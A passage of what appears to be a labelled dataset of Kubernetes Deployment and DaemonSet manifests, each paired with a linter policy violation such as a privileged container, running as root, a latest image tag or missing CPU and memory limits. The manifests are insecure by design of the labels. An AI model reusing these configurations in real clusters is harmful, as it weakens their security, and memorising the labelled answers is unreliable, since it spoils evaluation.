    "manifest_path": "data/manifests/the_stack_sample/sample_0280.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: director\n  namespace: dataleague\n  labels:\n    app: director\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: director\n  template:\n    metadata:\n      labels:\n        app: director\n      annotations:\n        timestamp: '{{ .Values.timestamp }}'\n    spec:\n      initContainers:\n      - name: wait-nakama-grpc-api\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz nakama.dataleague.svc.cluster.local 7349; do echo \"Waiting\n          for Nakama gRPC API\"; sleep 2; done;\n      - name: wait-open-match-backend\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz open-match-backend.open-match.svc.cluster.local 50505; do echo\n          \"Waiting for OM backend\"; sleep 2; done;\n      - name: wait-om-function\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz matchfunction.dataleague.svc.cluster.local 50502; do echo \"Waiting\n          for OM function\"; sleep 2; done;\n      containers:\n      - name: director\n        image: '{{- .Values.openmatch.director.image -}}'\n        imagePullPolicy: Always\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"wait-open-match-backend\" does not have a read-only root file system"
  },
  {
    "id": "01089",
    "manifest_path": "data/manifests/the_stack_sample/sample_0280.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: director\n  namespace: dataleague\n  labels:\n    app: director\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: director\n  template:\n    metadata:\n      labels:\n        app: director\n      annotations:\n        timestamp: '{{ .Values.timestamp }}'\n    spec:\n      initContainers:\n      - name: wait-nakama-grpc-api\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz nakama.dataleague.svc.cluster.local 7349; do echo \"Waiting\n          for Nakama gRPC API\"; sleep 2; done;\n      - name: wait-open-match-backend\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz open-match-backend.open-match.svc.cluster.local 50505; do echo\n          \"Waiting for OM backend\"; sleep 2; done;\n      - name: wait-om-function\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz matchfunction.dataleague.svc.cluster.local 50502; do echo \"Waiting\n          for OM function\"; sleep 2; done;\n      containers:\n      - name: director\n        image: '{{- .Values.openmatch.director.image -}}'\n        imagePullPolicy: Always\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"director\" is not set to runAsNonRoot"
  },
  {
    "id": "01090",
    "manifest_path": "data/manifests/the_stack_sample/sample_0280.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: director\n  namespace: dataleague\n  labels:\n    app: director\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: director\n  template:\n    metadata:\n      labels:\n        app: director\n      annotations:\n        timestamp: '{{ .Values.timestamp }}'\n    spec:\n      initContainers:\n      - name: wait-nakama-grpc-api\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz nakama.dataleague.svc.cluster.local 7349; do echo \"Waiting\n          for Nakama gRPC API\"; sleep 2; done;\n      - name: wait-open-match-backend\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz open-match-backend.open-match.svc.cluster.local 50505; do echo\n          \"Waiting for OM backend\"; sleep 2; done;\n      - name: wait-om-function\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz matchfunction.dataleague.svc.cluster.local 50502; do echo \"Waiting\n          for OM function\"; sleep 2; done;\n      containers:\n      - name: director\n        image: '{{- .Values.openmatch.director.image -}}'\n        imagePullPolicy: Always\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"wait-nakama-grpc-api\" is not set to runAsNonRoot"
  },
  {
    "id": "01091",
    "manifest_path": "data/manifests/the_stack_sample/sample_0280.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: director\n  namespace: dataleague\n  labels:\n    app: director\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: director\n  template:\n    metadata:\n      labels:\n        app: director\n      annotations:\n        timestamp: '{{ .Values.timestamp }}'\n    spec:\n      initContainers:\n      - name: wait-nakama-grpc-api\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz nakama.dataleague.svc.cluster.local 7349; do echo \"Waiting\n          for Nakama gRPC API\"; sleep 2; done;\n      - name: wait-open-match-backend\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz open-match-backend.open-match.svc.cluster.local 50505; do echo\n          \"Waiting for OM backend\"; sleep 2; done;\n      - name: wait-om-function\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz matchfunction.dataleague.svc.cluster.local 50502; do echo \"Waiting\n          for OM function\"; sleep 2; done;\n      containers:\n      - name: director\n        image: '{{- .Values.openmatch.director.image -}}'\n        imagePullPolicy: Always\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"wait-om-function\" is not set to runAsNonRoot"
  },
  {
    "id": "01092",
    "manifest_path": "data/manifests/the_stack_sample/sample_0280.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: director\n  namespace: dataleague\n  labels:\n    app: director\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: director\n  template:\n    metadata:\n      labels:\n        app: director\n      annotations:\n        timestamp: '{{ .Values.timestamp }}'\n    spec:\n      initContainers:\n      - name: wait-nakama-grpc-api\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz nakama.dataleague.svc.cluster.local 7349; do echo \"Waiting\n          for Nakama gRPC API\"; sleep 2; done;\n      - name: wait-open-match-backend\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz open-match-backend.open-match.svc.cluster.local 50505; do echo\n          \"Waiting for OM backend\"; sleep 2; done;\n      - name: wait-om-function\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz matchfunction.dataleague.svc.cluster.local 50502; do echo \"Waiting\n          for OM function\"; sleep 2; done;\n      containers:\n      - name: director\n        image: '{{- .Values.openmatch.director.image -}}'\n        imagePullPolicy: Always\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"wait-open-match-backend\" is not set to runAsNonRoot"
  },
  {
    "id": "01093",
    "manifest_path": "data/manifests/the_stack_sample/sample_0280.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: director\n  namespace: dataleague\n  labels:\n    app: director\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: director\n  template:\n    metadata:\n      labels:\n        app: director\n      annotations:\n        timestamp: '{{ .Values.timestamp }}'\n    spec:\n      initContainers:\n      - name: wait-nakama-grpc-api\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz nakama.dataleague.svc.cluster.local 7349; do echo \"Waiting\n          for Nakama gRPC API\"; sleep 2; done;\n      - name: wait-open-match-backend\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz open-match-backend.open-match.svc.cluster.local 50505; do echo\n          \"Waiting for OM backend\"; sleep 2; done;\n      - name: wait-om-function\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz matchfunction.dataleague.svc.cluster.local 50502; do echo \"Waiting\n          for OM function\"; sleep 2; done;\n      containers:\n      - name: director\n        image: '{{- .Values.openmatch.director.image -}}'\n        imagePullPolicy: Always\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"director\" has cpu request 0"
  },
  {
    "id": "01094",
    "manifest_path": "data/manifests/the_stack_sample/sample_0280.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: director\n  namespace: dataleague\n  labels:\n    app: director\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: director\n  template:\n    metadata:\n      labels:\n        app: director\n      annotations:\n        timestamp: '{{ .Values.timestamp }}'\n    spec:\n      initContainers:\n      - name: wait-nakama-grpc-api\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz nakama.dataleague.svc.cluster.local 7349; do echo \"Waiting\n          for Nakama gRPC API\"; sleep 2; done;\n      - name: wait-open-match-backend\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz open-match-backend.open-match.svc.cluster.local 50505; do echo\n          \"Waiting for OM backend\"; sleep 2; done;\n      - name: wait-om-function\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz matchfunction.dataleague.svc.cluster.local 50502; do echo \"Waiting\n          for OM function\"; sleep 2; done;\n      containers:\n      - name: director\n        image: '{{- .Values.openmatch.director.image -}}'\n        imagePullPolicy: Always\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"wait-nakama-grpc-api\" has cpu request 0"
  },
  {
    "id": "01095",
    "manifest_path": "data/manifests/the_stack_sample/sample_0280.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: director\n  namespace: dataleague\n  labels:\n    app: director\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: director\n  template:\n    metadata:\n      labels:\n        app: director\n      annotations:\n        timestamp: '{{ .Values.timestamp }}'\n    spec:\n      initContainers:\n      - name: wait-nakama-grpc-api\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz nakama.dataleague.svc.cluster.local 7349; do echo \"Waiting\n          for Nakama gRPC API\"; sleep 2; done;\n      - name: wait-open-match-backend\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz open-match-backend.open-match.svc.cluster.local 50505; do echo\n          \"Waiting for OM backend\"; sleep 2; done;\n      - name: wait-om-function\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz matchfunction.dataleague.svc.cluster.local 50502; do echo \"Waiting\n          for OM function\"; sleep 2; done;\n      containers:\n      - name: director\n        image: '{{- .Values.openmatch.director.image -}}'\n        imagePullPolicy: Always\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"wait-om-function\" has cpu request 0"
  },
  {
    "id": "01096",
    "manifest_path": "data/manifests/the_stack_sample/sample_0280.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: director\n  namespace: dataleague\n  labels:\n    app: director\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: director\n  template:\n    metadata:\n      labels:\n        app: director\n      annotations:\n        timestamp: '{{ .Values.timestamp }}'\n    spec:\n      initContainers:\n      - name: wait-nakama-grpc-api\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz nakama.dataleague.svc.cluster.local 7349; do echo \"Waiting\n          for Nakama gRPC API\"; sleep 2; done;\n      - name: wait-open-match-backend\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz open-match-backend.open-match.svc.cluster.local 50505; do echo\n          \"Waiting for OM backend\"; sleep 2; done;\n      - name: wait-om-function\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz matchfunction.dataleague.svc.cluster.local 50502; do echo \"Waiting\n          for OM function\"; sleep 2; done;\n      containers:\n      - name: director\n        image: '{{- .Values.openmatch.director.image -}}'\n        imagePullPolicy: Always\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"wait-open-match-backend\" has cpu request 0"
  },
  {
    "id": "01097",
    "manifest_path": "data/manifests/the_stack_sample/sample_0280.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: director\n  namespace: dataleague\n  labels:\n    app: director\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: director\n  template:\n    metadata:\n      labels:\n        app: director\n      annotations:\n        timestamp: '{{ .Values.timestamp }}'\n    spec:\n      initContainers:\n      - name: wait-nakama-grpc-api\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz nakama.dataleague.svc.cluster.local 7349; do echo \"Waiting\n          for Nakama gRPC API\"; sleep 2; done;\n      - name: wait-open-match-backend\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz open-match-backend.open-match.svc.cluster.local 50505; do echo\n          \"Waiting for OM backend\"; sleep 2; done;\n      - name: wait-om-function\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz matchfunction.dataleague.svc.cluster.local 50502; do echo \"Waiting\n          for OM function\"; sleep 2; done;\n      containers:\n      - name: director\n        image: '{{- .Values.openmatch.director.image -}}'\n        imagePullPolicy: Always\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"director\" has memory limit 0"
  },
  {
    "id": "01098",
    "manifest_path": "data/manifests/the_stack_sample/sample_0280.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: director\n  namespace: dataleague\n  labels:\n    app: director\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: director\n  template:\n    metadata:\n      labels:\n        app: director\n      annotations:\n        timestamp: '{{ .Values.timestamp }}'\n    spec:\n      initContainers:\n      - name: wait-nakama-grpc-api\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz nakama.dataleague.svc.cluster.local 7349; do echo \"Waiting\n          for Nakama gRPC API\"; sleep 2; done;\n      - name: wait-open-match-backend\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz open-match-backend.open-match.svc.cluster.local 50505; do echo\n          \"Waiting for OM backend\"; sleep 2; done;\n      - name: wait-om-function\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz matchfunction.dataleague.svc.cluster.local 50502; do echo \"Waiting\n          for OM function\"; sleep 2; done;\n      containers:\n      - name: director\n        image: '{{- .Values.openmatch.director.image -}}'\n        imagePullPolicy: Always\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"wait-nakama-grpc-api\" has memory limit 0"
  },
  {
    "id": "01099",
    "manifest_path": "data/manifests/the_stack_sample/sample_0280.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: director\n  namespace: dataleague\n  labels:\n    app: director\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: director\n  template:\n    metadata:\n      labels:\n        app: director\n      annotations:\n        timestamp: '{{ .Values.timestamp }}'\n    spec:\n      initContainers:\n      - name: wait-nakama-grpc-api\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz nakama.dataleague.svc.cluster.local 7349; do echo \"Waiting\n          for Nakama gRPC API\"; sleep 2; done;\n      - name: wait-open-match-backend\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz open-match-backend.open-match.svc.cluster.local 50505; do echo\n          \"Waiting for OM backend\"; sleep 2; done;\n      - name: wait-om-function\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz matchfunction.dataleague.svc.cluster.local 50502; do echo \"Waiting\n          for OM function\"; sleep 2; done;\n      containers:\n      - name: director\n        image: '{{- .Values.openmatch.director.image -}}'\n        imagePullPolicy: Always\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"wait-om-function\" has memory limit 0"
  },
  {
    "id": "01100",
    "manifest_path": "data/manifests/the_stack_sample/sample_0280.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: director\n  namespace: dataleague\n  labels:\n    app: director\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: director\n  template:\n    metadata:\n      labels:\n        app: director\n      annotations:\n        timestamp: '{{ .Values.timestamp }}'\n    spec:\n      initContainers:\n      - name: wait-nakama-grpc-api\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz nakama.dataleague.svc.cluster.local 7349; do echo \"Waiting\n          for Nakama gRPC API\"; sleep 2; done;\n      - name: wait-open-match-backend\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz open-match-backend.open-match.svc.cluster.local 50505; do echo\n          \"Waiting for OM backend\"; sleep 2; done;\n      - name: wait-om-function\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz matchfunction.dataleague.svc.cluster.local 50502; do echo \"Waiting\n          for OM function\"; sleep 2; done;\n      containers:\n      - name: director\n        image: '{{- .Values.openmatch.director.image -}}'\n        imagePullPolicy: Always\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"wait-open-match-backend\" has memory limit 0"
  },
  {
    "id": "01101",
    "manifest_path": "data/manifests/the_stack_sample/sample_0284.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: blossom-reposter-staging\n  name: instagram-producer\n  labels:\n    app: instagram-producer\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: instagram-producer\n  template:\n    metadata:\n      labels:\n        app: instagram-producer\n    spec:\n      containers:\n      - name: instagram-producer\n        image: docker.pkg.github.com/wmw9/blossom-reposter/instagram-producer:latest\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 80\n        envFrom:\n        - configMapRef:\n            name: blossom-reposter-config\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"instagram-producer\" is using an invalid container image, \"docker.pkg.github.com/wmw9/blossom-reposter/instagram-producer:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01102",
    "manifest_path": "data/manifests/the_stack_sample/sample_0284.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: blossom-reposter-staging\n  name: instagram-producer\n  labels:\n    app: instagram-producer\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: instagram-producer\n  template:\n    metadata:\n      labels:\n        app: instagram-producer\n    spec:\n      containers:\n      - name: instagram-producer\n        image: docker.pkg.github.com/wmw9/blossom-reposter/instagram-producer:latest\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 80\n        envFrom:\n        - configMapRef:\n            name: blossom-reposter-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"instagram-producer\" does not have a read-only root file system"
  },
  {
    "id": "01103",
    "manifest_path": "data/manifests/the_stack_sample/sample_0284.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: blossom-reposter-staging\n  name: instagram-producer\n  labels:\n    app: instagram-producer\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: instagram-producer\n  template:\n    metadata:\n      labels:\n        app: instagram-producer\n    spec:\n      containers:\n      - name: instagram-producer\n        image: docker.pkg.github.com/wmw9/blossom-reposter/instagram-producer:latest\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 80\n        envFrom:\n        - configMapRef:\n            name: blossom-reposter-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"instagram-producer\" is not set to runAsNonRoot"
  },
  {
    "id": "01104",
    "manifest_path": "data/manifests/the_stack_sample/sample_0284.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: blossom-reposter-staging\n  name: instagram-producer\n  labels:\n    app: instagram-producer\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: instagram-producer\n  template:\n    metadata:\n      labels:\n        app: instagram-producer\n    spec:\n      containers:\n      - name: instagram-producer\n        image: docker.pkg.github.com/wmw9/blossom-reposter/instagram-producer:latest\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 80\n        envFrom:\n        - configMapRef:\n            name: blossom-reposter-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"instagram-producer\" has cpu request 0"
  },
  {
    "id": "01105",
    "manifest_path": "data/manifests/the_stack_sample/sample_0284.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: blossom-reposter-staging\n  name: instagram-producer\n  labels:\n    app: instagram-producer\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: instagram-producer\n  template:\n    metadata:\n      labels:\n        app: instagram-producer\n    spec:\n      containers:\n      - name: instagram-producer\n        image: docker.pkg.github.com/wmw9/blossom-reposter/instagram-producer:latest\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 80\n        envFrom:\n        - configMapRef:\n            name: blossom-reposter-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"instagram-producer\" has memory limit 0"
  },
  {
    "id": "01106",
    "manifest_path": "data/manifests/the_stack_sample/sample_0287.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: ttcs-agent\n  labels:\n    app: ttcs-agent\nspec:\n  selector:\n    matchLabels:\n      app: ttcs-agent\n  template:\n    metadata:\n      labels:\n        app: ttcs-agent\n    spec:\n      containers:\n      - name: ttcs-agent\n        image: gcr.io/canvas-diagram-295814/ttcs-agent-image:latest\n        ports:\n        - containerPort: 6171\n        securityContext:\n          privileged: true\n        env:\n        - name: FLAGS_subscription_mode\n          value: 'true'\n        - name: FLAGS_coordinator_address\n          value: c-jb7399-264b.gcp.ticktocknetworks.com\n        - name: FLAGS_coordinator_subscription_service_port\n          value: '6176'\n        - name: FLAGS_probe_port\n          value: '3190'\n        - name: FLAGS_correct_clock\n          value: 'true'\n        - name: FLAGS_management_address\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: FLAGS_probe_address\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: FLAGS_agent_name\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"ttcs-agent\" is using an invalid container image, \"gcr.io/canvas-diagram-295814/ttcs-agent-image:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01107",
    "manifest_path": "data/manifests/the_stack_sample/sample_0287.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: ttcs-agent\n  labels:\n    app: ttcs-agent\nspec:\n  selector:\n    matchLabels:\n      app: ttcs-agent\n  template:\n    metadata:\n      labels:\n        app: ttcs-agent\n    spec:\n      containers:\n      - name: ttcs-agent\n        image: gcr.io/canvas-diagram-295814/ttcs-agent-image:latest\n        ports:\n        - containerPort: 6171\n        securityContext:\n          privileged: true\n        env:\n        - name: FLAGS_subscription_mode\n          value: 'true'\n        - name: FLAGS_coordinator_address\n          value: c-jb7399-264b.gcp.ticktocknetworks.com\n        - name: FLAGS_coordinator_subscription_service_port\n          value: '6176'\n        - name: FLAGS_probe_port\n          value: '3190'\n        - name: FLAGS_correct_clock\n          value: 'true'\n        - name: FLAGS_management_address\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: FLAGS_probe_address\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: FLAGS_agent_name\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ttcs-agent\" does not have a read-only root file system"
  },
  {
    "id": "01108",
    "manifest_path": "data/manifests/the_stack_sample/sample_0287.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: ttcs-agent\n  labels:\n    app: ttcs-agent\nspec:\n  selector:\n    matchLabels:\n      app: ttcs-agent\n  template:\n    metadata:\n      labels:\n        app: ttcs-agent\n    spec:\n      containers:\n      - name: ttcs-agent\n        image: gcr.io/canvas-diagram-295814/ttcs-agent-image:latest\n        ports:\n        - containerPort: 6171\n        securityContext:\n          privileged: true\n        env:\n        - name: FLAGS_subscription_mode\n          value: 'true'\n        - name: FLAGS_coordinator_address\n          value: c-jb7399-264b.gcp.ticktocknetworks.com\n        - name: FLAGS_coordinator_subscription_service_port\n          value: '6176'\n        - name: FLAGS_probe_port\n          value: '3190'\n        - name: FLAGS_correct_clock\n          value: 'true'\n        - name: FLAGS_management_address\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: FLAGS_probe_address\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: FLAGS_agent_name\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"ttcs-agent\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "01109",
    "manifest_path": "data/manifests/the_stack_sample/sample_0287.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: ttcs-agent\n  labels:\n    app: ttcs-agent\nspec:\n  selector:\n    matchLabels:\n      app: ttcs-agent\n  template:\n    metadata:\n      labels:\n        app: ttcs-agent\n    spec:\n      containers:\n      - name: ttcs-agent\n        image: gcr.io/canvas-diagram-295814/ttcs-agent-image:latest\n        ports:\n        - containerPort: 6171\n        securityContext:\n          privileged: true\n        env:\n        - name: FLAGS_subscription_mode\n          value: 'true'\n        - name: FLAGS_coordinator_address\n          value: c-jb7399-264b.gcp.ticktocknetworks.com\n        - name: FLAGS_coordinator_subscription_service_port\n          value: '6176'\n        - name: FLAGS_probe_port\n          value: '3190'\n        - name: FLAGS_correct_clock\n          value: 'true'\n        - name: FLAGS_management_address\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: FLAGS_probe_address\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: FLAGS_agent_name\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"ttcs-agent\" is privileged"
  },
  {
    "id": "01110",
    "manifest_path": "data/manifests/the_stack_sample/sample_0287.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: ttcs-agent\n  labels:\n    app: ttcs-agent\nspec:\n  selector:\n    matchLabels:\n      app: ttcs-agent\n  template:\n    metadata:\n      labels:\n        app: ttcs-agent\n    spec:\n      containers:\n      - name: ttcs-agent\n        image: gcr.io/canvas-diagram-295814/ttcs-agent-image:latest\n        ports:\n        - containerPort: 6171\n        securityContext:\n          privileged: true\n        env:\n        - name: FLAGS_subscription_mode\n          value: 'true'\n        - name: FLAGS_coordinator_address\n          value: c-jb7399-264b.gcp.ticktocknetworks.com\n        - name: FLAGS_coordinator_subscription_service_port\n          value: '6176'\n        - name: FLAGS_probe_port\n          value: '3190'\n        - name: FLAGS_correct_clock\n          value: 'true'\n        - name: FLAGS_management_address\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: FLAGS_probe_address\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: FLAGS_agent_name\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ttcs-agent\" is not set to runAsNonRoot"
  },
  {
    "id": "01111",
    "manifest_path": "data/manifests/the_stack_sample/sample_0287.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: ttcs-agent\n  labels:\n    app: ttcs-agent\nspec:\n  selector:\n    matchLabels:\n      app: ttcs-agent\n  template:\n    metadata:\n      labels:\n        app: ttcs-agent\n    spec:\n      containers:\n      - name: ttcs-agent\n        image: gcr.io/canvas-diagram-295814/ttcs-agent-image:latest\n        ports:\n        - containerPort: 6171\n        securityContext:\n          privileged: true\n        env:\n        - name: FLAGS_subscription_mode\n          value: 'true'\n        - name: FLAGS_coordinator_address\n          value: c-jb7399-264b.gcp.ticktocknetworks.com\n        - name: FLAGS_coordinator_subscription_service_port\n          value: '6176'\n        - name: FLAGS_probe_port\n          value: '3190'\n        - name: FLAGS_correct_clock\n          value: 'true'\n        - name: FLAGS_management_address\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: FLAGS_probe_address\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: FLAGS_agent_name\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ttcs-agent\" has cpu request 0"
  },
  {
    "id": "01112",
    "manifest_path": "data/manifests/the_stack_sample/sample_0287.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: ttcs-agent\n  labels:\n    app: ttcs-agent\nspec:\n  selector:\n    matchLabels:\n      app: ttcs-agent\n  template:\n    metadata:\n      labels:\n        app: ttcs-agent\n    spec:\n      containers:\n      - name: ttcs-agent\n        image: gcr.io/canvas-diagram-295814/ttcs-agent-image:latest\n        ports:\n        - containerPort: 6171\n        securityContext:\n          privileged: true\n        env:\n        - name: FLAGS_subscription_mode\n          value: 'true'\n        - name: FLAGS_coordinator_address\n          value: c-jb7399-264b.gcp.ticktocknetworks.com\n        - name: FLAGS_coordinator_subscription_service_port\n          value: '6176'\n        - name: FLAGS_probe_port\n          value: '3190'\n        - name: FLAGS_correct_clock\n          value: 'true'\n        - name: FLAGS_management_address\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: FLAGS_probe_address\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: FLAGS_agent_name\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ttcs-agent\" has memory limit 0"
  },
  {
    "id": "01113",
    "manifest_path": "data/manifests/the_stack_sample/sample_0291.yaml",
